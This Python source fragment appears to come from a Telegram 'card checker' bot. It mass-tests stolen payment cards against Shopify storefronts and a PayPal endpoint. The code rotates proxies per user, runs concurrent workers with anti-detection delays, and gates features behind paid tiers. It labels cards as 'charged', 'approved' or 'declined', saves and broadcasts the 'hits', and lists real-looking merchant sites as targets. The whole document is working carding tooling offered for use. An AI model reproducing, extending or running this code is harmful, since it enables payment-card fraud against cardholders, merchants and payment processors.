                    user_manager.increment_hits(user_id)
                    
                elif status_category == "declined":
                    stats["declined"] += 1
                    # Silent for declined
                    
                else:
                    stats["errors"] += 1
                
                stats["processed"] += 1
                
                if stats["processed"] % 5 == 0 or stats["processed"] == total_cards:
                    await update_progress_buttons(
                        context, message.chat_id, progress_msg.message_id,
                        stats["processed"], total_cards,
                        stats["charged"] + stats["approved"],
                        stats["declined"],
                        f"Worker #{worker_id} | Site: {site[:30]}",
                        f"Processing..."
                    )
            
            user_manager.increment_checks(user_id, 1)
            
            config = MSH_WORKER_CONFIG.get(user_manager.get_tier(user_id), MSH_WORKER_CONFIG["free"])
            await asyncio.sleep(config["delay"])
            
        except Exception as e:
            print(f"❌ [WORKER #{worker_id}] Error: {e}")
            async with results_lock:
                stats["errors"] += 1
                stats["processed"] += 1
        finally:
            card_queue.task_done()
    
    print(f"👷 [WORKER #{worker_id}] Finished")

    
def get_working_proxy_for_shopify_mass(user_id: int, worker_id: str = None) -> Optional[str]:
    """Get a working proxy for MSH from user's proxy pool"""
    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
        return None
    
    available = [p for p in proxy_manager.user_proxies[user_id] 
                 if p not in proxy_manager.user_failed_proxies.get(user_id, set())]
    
    if not available:
        proxy_manager.user_failed_proxies[user_id] = set()
        available = proxy_manager.user_proxies[user_id].copy()
    
    if not available:
        return None
    
    key = f"{user_id}_msh_{worker_id}" if worker_id else f"{user_id}_msh"
    if not hasattr(proxy_manager, 'msh_indices'):
        proxy_manager.msh_indices = {}
    
    idx = proxy_manager.msh_indices.get(key, 0) % len(available)
    selected = available[idx]
    proxy_manager.msh_indices[key] = idx + 1
    
    return selected

    
async def shopify_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Shopify gateway (using PayPal API internally) - FIXED for multi-user"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [SHOPIFY MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    try:
        shopify_active_tasks[u_id] = True
        tier = user_manager.get_tier(u_id)
        
        # Get amount from user settings
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
        
        # Concurrency based on tier
        CONCURRENCY = {
            "free": 1,
            "premium": 1,
            "ultimate": 2,
            "admin": 2,
        }.get(tier, 1)
        
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                f"🔄 <b>Shopify Mass Check Started</b>\n\n"
                f"📝 Cards: {total}\n"
                f"🔀 Parallel: {CONCURRENCY}\n"
                f"💰 Amount: ${amount}\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        results_lock = asyncio.Lock()
        processed_count = 0
        
        async def process_card(card: str, idx: int):
            nonlocal processed_count
            
            async with semaphore:
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    proxy_str = get_proxy_for_user(u_id, 'paypal')
                
                start_time_card = time.time()
                
                # Use PayPal API internally
                result = await check_card_paypal(card, amount, currency, proxy_str, u_id)
                
                elapsed = time.time() - start_time_card
                
                async with results_lock:
                    processed_count += 1
                    if processed_count % 5 == 0 or processed_count == total:
                        await update_progress_buttons(
                            context, message.chat_id, progress_msg.message_id,
                            processed_count, total,
                            stats["charged"] + stats["approved"],
                            stats["declined"],
                            f"{processed_count}/{total}",
                            f"Processing..."
                        )
                    
                    # ============ CRITICAL FIX: Yield control to other users ============
                    await asyncio.sleep(0)
                
                return idx, result, card, elapsed
        
        # Process all cards
        tasks = [process_card(card, i) for i, card in enumerate(cards)]
        
        # ============ CRITICAL FIX: Use asyncio.gather with proper concurrency ============
        # Instead of as_completed which can block, use gather with a semaphore
        for i in range(0, len(tasks), CONCURRENCY):
            if u_id not in shopify_active_tasks:
                break
            
            chunk = tasks[i:i+CONCURRENCY]
            try:
                chunk_results = await asyncio.gather(*chunk, return_exceptions=True)
                
                for item in chunk_results:
                    if u_id not in shopify_active_tasks:
                        break
                    
                    if isinstance(item, Exception):
                        async with results_lock:
                            stats["errors"] += 1
                        continue
                    
                    idx, result, card, elapsed = item
                    if not result or not card:
                        continue
                    
                    # Process result (same as before)
                    bin_info = await get_bin_info(card)
                    bin_info_text, bank, country, currency_code, country_code = bin_info
                    
                    if result:
                        response_text = result.get("message", "UNKNOWN")
                        status_category = result.get("status_category", "unknown")
                        result_status = result.get("result", "")
                        result_code = result.get("code", "")
                        
                        response_upper = response_text.upper()
                        code_upper = result_code.upper()
                        
                        # Charged patterns
                        charged_patterns = [
                            "CHARGED", "ORDER COMPLETED", "PAID", "COMPLETED","ORDER_PLACED",
                            "RISK_DISALLOWED", "RISK", 
                        ]
                        
                        otp_patterns = ["OTP", "3D", "SECURE", "EXISTING_ACCOUNT_RESTRICTED", "AUTHENTICATION", "3DS"]
                        
                        is_charged = any(p in response_upper for p in charged_patterns) or any(p in code_upper for p in charged_patterns)
                        is_otp = any(p in response_upper for p in otp_patterns)
                        
                        if is_charged:
                            status_display = "🔥 CHARGED 🔥"
                            status_category_final = "charged"
                            response_msg = "Order completed 💎"
                            async with results_lock:
                                stats["charged"] += 1
                            print(f"🔥 [SHOPIFY MASS] CHARGED detected for card: {card[:20]}...")
                            
                        elif is_otp:
                            status_display = "🔐 3D REQUIRED"
                            status_category_final = "approved"
                            response_msg = "OTP_REQUIRED - 3D Secure needed"
                            async with results_lock:
                                stats["approved"] += 1
                            print(f"🔐 [SHOPIFY MASS] 3D REQUIRED for card: {card[:20]}...")
                            
                        elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                            status_display = "💰 INSUFFICIENT FUNDS"
                            status_category_final = "approved"
                            response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                            async with results_lock:
                                stats["approved"] += 1
                            print(f"💰 [SHOPIFY MASS] INSUFFICIENT FUNDS for card: {card[:20]}...")
                            
                        else:
                            status_display = "❌ DECLINED"
                            status_category_final = "declined"
                            response_msg = "CARD DECLINED"
                            async with results_lock:
                                stats["declined"] += 1
                        
                        try:
                            price_float = float(amount)
                            price_str = f"${price_float:.2f}"
                        except:
                            price_str = f"${amount}"
                        
                        if status_category_final in ["charged", "approved"]:
                            ui = (
                                f"┏━━━━━━━⍟\n"
                                f"┃ {status_display}\n"
                                f"┗━━━━━━━━━━━⊛\n\n"
                                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                                f"━━━━━━━━━━━━━━━━━━━\n"
                                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                                f"━━━━━━━━━━━━━━━━━━━"
                            )
                            
                            try:
                                await message.reply_text(ui, parse_mode=ParseMode.HTML)
                            except Exception as e:
                                print(f"❌ [SHOPIFY MASS] Error sending message: {e}")
                            
                            await save_hit_to_file(
                                card=card,
                                gateway="Shopify Payments",
                                response=response_msg,
                                price=price_str,
                                bin_info=bin_info,
                                user_id=u_id,
                                user_tier=tier
                            )
                            
                            if status_category_final == "charged":
                                user_data = user_manager.get_user(u_id)
                                await send_hit_notification(
                                    context=context,
                                    gateway="Shopify Payments",
                                    card=card,
                                    response=response_msg,
                                    price=price_str,
                                    user=user_data,
                                    bin_info=bin_info,
                                    status_category="charged"
                                )
                            
                            user_manager.increment_hits(u_id)
                    
                    user_manager.increment_checks(u_id, 1)
                    
                    # ============ CRITICAL FIX: Yield control after each card ============
                    await asyncio.sleep(0)
                    
            except asyncio.TimeoutError:
                print(f"⚠️ Chunk timeout for user {u_id}")
                continue
        
        if u_id in shopify_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            summary = (
                f"🏁 <b>Shopify Mass Check Complete</b>\n\n"
                f"🔥 Charged: {stats['charged']}\n"
                f"🔐 3D/OTP: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {total}\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
        
    except Exception as e:
        print(f"❌ Shopify mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        shopify_active_tasks.pop(u_id, None)


async def msh_mass_check_worker_mode(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """MSH Mass check - USES AUTOSOPI SITES for rotation"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    if u_id in msh_active_tasks:
        await message.reply_text("⚠️ You already have a mass check running. Use /stopmsh to cancel.")
        return
    
    tier = user_manager.get_tier(u_id)
    config = MSH_WORKER_CONFIG.get(tier, MSH_WORKER_CONFIG["free"])
    worker_count = config["workers"]
    
    # Get site count from Autosopi manager
    site_count = len(autosopi_site_manager.sites)
    
    print(f"\n{'='*80}")
    print(f"👷 [MSH] Starting for user {u_id}")
    print(f"📊 Cards: {total} | 👥 Workers: {worker_count} | 🎯 Tier: {tier.upper()}")
    print(f"🌐 Autosopi sites available: {site_count}")
    print(f"{'='*80}")
    
    if not user_manager.can_mass_check(u_id):
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\nUse /sh for single checks.\n💎 Upgrade to Premium/Ultimate.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_access_gateway(u_id, 'shopify'):
        await message.reply_text("❌ Your tier doesn't have access to Shopify gateway.")
        return
    
    max_batch = user_manager.get_max_batch_size(u_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Truncated to {max_batch} cards (your tier limit)")
        total = len(cards)
    
    # Create progress message
    progress_msg = await message.reply_text(
        f"👷 <b>MSH Active</b>\n\n"
        f"🎯 Tier: {tier.upper()}\n"
        f"📝 Cards: {total}\n"
        f"🚀 Starting...",
        parse_mode=ParseMode.HTML,
        reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting workers...")
    )
    
    msh_active_tasks[u_id] = True
    
    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0, "processed": 0, "total": total}
    results_lock = asyncio.Lock()
    start_time = time.time()
    
    # Create queue
    card_queue = asyncio.Queue()
    for card in cards:
        await card_queue.put(card)
    
    # Start workers
    workers = []
    for i in range(worker_count):
        worker = asyncio.create_task(
            msh_single_worker(update, context, card_queue, i + 1,
                            stats, results_lock, u_id, progress_msg, total)
        )
        workers.append(worker)
    
    await asyncio.gather(*workers, return_exceptions=True)
    
    # Final summary
    if u_id in msh_active_tasks:
        total_time = time.time() - start_time
        minutes, seconds = int(total_time // 60), int(total_time % 60)
        
        proxy_count = len(proxy_manager.user_proxies.get(u_id, []))
        working_count = len(autosopi_proxy_tracker.working_proxies.get(u_id, [])) if hasattr(autosopi_proxy_tracker, 'working_proxies') else 0
        
        summary = (
            f"🏁 <b>MSH Complete</b>\n\n"
            f"🔥 Charged: {stats['charged']}\n"
            f"✅ Approved: {stats['approved']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"⚠️ Errors: {stats['errors']}\n"
            f"📝 Total: {total}\n"
            f"⏱️ Time: {minutes}m {seconds}s"
        )
        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    
    msh_active_tasks.pop(u_id, None)
    print(f"🏁 [MSH] Session ended for user {u_id}")


# ============ UPDATED MSH WITH SITE VALIDATION ============

# Add this to track which sites work with MSH API
msh_working_sites_cache = {}  # site -> last_working_time
msh_failed_sites = set()  # sites that returned "Invalid site URL"


async def validate_msh_site(site: str) -> bool:
    """
    Test if a site works with MSH API using a test card
    Returns True if site is valid
    """
    # Check cache first (valid for 5 minutes)
    if site in msh_working_sites_cache:
        last_working = msh_working_sites_cache.get(site, 0)
        if time.time() - last_working < 300:  # 5 minutes cache
            return True
    
    # Skip known failed sites
    if site in msh_failed_sites:
        return False
    
    test_card = "4111111111111111|12|2025|123"  # Test card that will be declined
    
    try:
        # Clean site URL
        if site.startswith(('http://', 'https://')):
            site_clean = site.split('://')[1]
        else:
            site_clean = site
        
        params = {
            "cc": test_card,
            "url": site_clean
        }
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            response = await client.get(SHOPIFY_MASS_API_ENDPOINT, params=params)
        
        if response.status_code == 200:
            data = response.json()
            response_text = data.get("Response", "")
            
            # If we get ANY response other than "Invalid site URL", site is working
            if "Invalid site URL" not in response_text and "invalid" not in response_text.lower():
                msh_working_sites_cache[site] = time.time()
                print(f"✅ [MSH] Site validated: {site}")
                return True
            else:
                msh_failed_sites.add(site)
                print(f"❌ [MSH] Site invalid: {site} - {response_text}")
                return False
        else:
            msh_failed_sites.add(site)
            return False
            
    except Exception as e:
        print(f"⚠️ [MSH] Site validation error for {site}: {e}")
        return False


def get_working_msh_sites() -> list:
    """
    Get list of sites that work with MSH API from Autosopi pool
    """
    working_sites = []
    
    # Get ALL sites from Autosopi manager (including .myshopify.com)
    for site in autosopi_site_manager.sites:
        # Add https:// prefix if missing
        if not site.startswith(('http://', 'https://')):
            working_sites.append(f"https://{site}")
        else:
            working_sites.append(site)
    
    # If no sites found, use defaults
    if not working_sites:
        print("⚠️ No sites from Autosopi pool, using defaults")
        working_sites = [
            "https://695128-3.myshopify.com",
            "https://markcol.myshopify.com",
            "https://7cqdzx-q9.myshopify.com",
            "https://convenia-5.myshopify.com",
            "https://addieandco.myshopify.com",
            "https://lm-products.myshopify.com",
            "https://havenicstore.myshopify.com",
            "https://anseladams.org",
            "https://brybelly.com",
            "https://store.perrinbrewing.com"
        ]
    
    print(f"📋 MSH sites available: {len(working_sites)}")
    return working_sites

async def _msh_single_worker_background(chat_id, progress_msg_id, context, card_queue, worker_id,
                                         stats, results_lock, amount, currency, user_id, total_cards):
    """Single worker that processes cards - yields control frequently"""
    
    while True:
        try:
            # Get card from queue with short timeout to allow checking stop signal
            try:
                card = await asyncio.wait_for(card_queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                # No more cards, check if we should exit
                if card_queue.empty():
                    break
                continue
            
            # Check if session was stopped (check via user_id in active tasks)
            if user_id not in shopify_active_tasks or user_id not in running_mass_checks:
                card_queue.task_done()
                break
            
            # Get proxy for this worker
            proxy_str = None
            if user_manager.can_use_proxy(user_id):
                proxy_str = get_rotating_proxy_for_user(user_id, f'msh_worker_{worker_id}')
            
            # Process the card
            result = await msh_worker_check_card(card, amount, currency, proxy_str, user_id, worker_id)
            
            # Get BIN info
            bin_info = await get_bin_info(card)
            bin_info_text, bank, country, currency_code, country_code = bin_info
            
            # Format response
            status_display = result.get("status_display", "❌ DECLINED")
            status_category = result.get("status_category", "declined")
            response_msg = result.get("message", "CARD DECLINED")
            price_str = result.get("price", f"${amount}")
            elapsed = result.get("elapsed", 0)
            
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status_display}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
            )
            
            # Update stats
            async with results_lock:
                if status_category == "charged":
                    stats["charged"] += 1
                    # Send result via bot (non-blocking)
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=ui,
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        print(f"❌ Error sending message: {e}")
                    
                    # Save hit
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    # Send notification
                    user_data = user_manager.get_user(user_id)
                    await send_hit_notification(
                        context=context,
                        gateway="Shopify Payments",
                        card=card,
                        response=response_msg,
                        price=price_str,
                        user=user_data,
                        bin_info=bin_info,
                        status_category="charged"
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "approved":
                    stats["approved"] += 1
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=ui,
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        print(f"❌ Error sending message: {e}")
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "declined":
                    stats["declined"] += 1
                    # Silent
                    
                else:
                    stats["errors"] += 1
                
                stats["processed"] += 1
                
                # Update progress every 5 cards
                if stats["processed"] % 5 == 0 or stats["processed"] == total_cards:
                    try:
                        await context.bot.edit_message_reply_markup(
                            chat_id=chat_id,
                            message_id=progress_msg_id,
                            reply_markup=create_progress_buttons(
                                stats["processed"], total_cards,
                                stats["charged"] + stats["approved"],
                                stats["declined"],
                                f"Worker #{worker_id}",
                                f"Processing..."
                            )
                        )
                    except Exception as e:
                        pass
            
            user_manager.increment_checks(user_id, 1)
            
            # Delay between cards
            config = MSH_WORKER_CONFIG.get(user_manager.get_tier(user_id), MSH_WORKER_CONFIG["free"])
            await asyncio.sleep(config["delay"])
            
            # Yield control after each card
            await asyncio.sleep(0)
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"❌ [WORKER #{worker_id}] Error processing card: {e}")
            async with results_lock:
                stats["errors"] += 1
                stats["processed"] += 1
        finally:
            card_queue.task_done()
    
    print(f"👷 [WORKER #{worker_id}] Finished")
        
async def mass_check_shopify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Shopify gateway using MSH API - /msh <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if this is a reply to a file
    if update.message.reply_to_message:
        user_id_reply = update.effective_user.id
        reply_to_msg_id = update.message.reply_to_message.message_id
        
        if user_id_reply in pending_files and pending_files[user_id_reply].get('message_id') == reply_to_msg_id:
            file_data = pending_files.pop(user_id_reply)
            cards = file_data['cards']
            
            if not user_manager.can_access_gateway(user_id, 'shopify'):
                await message.reply_text("❌ Your tier doesn't have access to Shopify gateway.")
                return
            
            await msh_mass_check_worker_mode(update, context, cards)
            return
    
    # Handle direct text input
    if not context.args:
        tier = user_manager.get_tier(user_id)
        worker_config = MSH_WORKER_CONFIG.get(tier, MSH_WORKER_CONFIG["free"])
        current_site = context.user_data.get('shopify_mass_site', 'anseladams.org')
        
        await message.reply_text(
            f"👷 <b>MSH Worker Mode - Shopify Mass Check</b>\n\n"
            f"Usage: <code>/msh &lt;card1&gt; &lt;card2&gt; ...</code>\n\n",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards from text
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Start worker mode
    await msh_mass_check_worker_mode(update, context, cards)

